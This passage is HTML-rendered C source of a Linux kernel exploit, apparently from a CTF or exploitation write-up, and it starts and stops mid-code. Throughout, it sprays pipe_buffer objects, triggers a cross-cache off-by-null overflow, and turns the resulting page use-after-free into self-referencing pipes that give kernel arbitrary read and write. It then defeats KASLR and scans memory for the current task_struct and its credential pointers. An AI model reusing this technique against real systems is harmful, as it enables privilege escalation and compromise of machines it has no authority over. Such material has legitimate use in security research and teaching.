class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(<span class="hljs-number">0</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);<br>    free_page(pgv_8pages_start_idx++);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_alloc(i, <span class="hljs-number">8</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] exetend pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="hljs-number">2</span>, PIPE_SPRAY_NUM / <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);  <span class="hljs-comment">/* prevent pipe_release() */</span><br>    &#125;<br><br>    <span class="hljs-comment">/* try to trigger cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KCACHE_NUM; i++) &#123;<br>        kcache_append(i, KCACHE_SIZE - <span class="hljs-number">8</span>, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* checking for cross-cache overflow */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;<br>            orig_pid = nr;<br>            victim_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>                   victim_pid, orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">24</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>           info_pipe_buf.page, info_pipe_buf.ops);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span><br>        || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-comment">/* construct a second-level page uaf */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*) ((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        <span class="hljs-keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (snd_vicitm_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">building_self_writing_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">24</span> <span class="hljs-number">-3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.page = info_pipe_buf.page;<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.ops = info_pipe_buf.ops;<br>    evil_pipe_buf.flags = info_pipe_buf.flags;<br>    evil_pipe_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_2nd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                    self_2nd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_2nd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_3rd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_3rd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_4th_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_buf</span>, <span class="hljs-title">evil_3rd_buf</span>, <span class="hljs-title">evil_4th_buf</span>;</span><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>]= &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span><br><span class="hljs-comment"> * We need to build a circle there for continuously memory seeking:</span><br><span class="hljs-comment"> * - 2nd pipe to search</span><br><span class="hljs-comment"> * - 3rd pipe to change 4th pipe</span><br><span class="hljs-comment"> * - 4th pipe to change 2nd and 3rd pipe</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br><br>    <span class="hljs-comment">/* hijack the 3rd pipe pointing to 4th */</span><br>    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>    evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_4th_buf.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>    evil_2nd_buf.page = page_to_read;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* read out data */</span><br>    read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="hljs-number">0x1000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *comm_addr;<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>    setup_evil_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span><br><span class="hljs-comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span><br><span class="hljs-comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span><br><span class="hljs-comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span><br><span class="hljs-comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span><br><span class="hljs-comment">     */</span><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x070</span>)) &#123;<br>            kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0x070</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>                   kernel_base, kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * For a machine with MEM less than 256M, we can simply get the:</span><br><span class="hljs-comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span><br><span class="hljs-comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span><br><span class="hljs-comment">     * So we need to find another way to calculate the page_offset_base.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span><br><span class="hljs-comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Note that the offset of different filed should be referred to your env.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), buf);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-57</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-56</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-57</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-50</span>] - <span 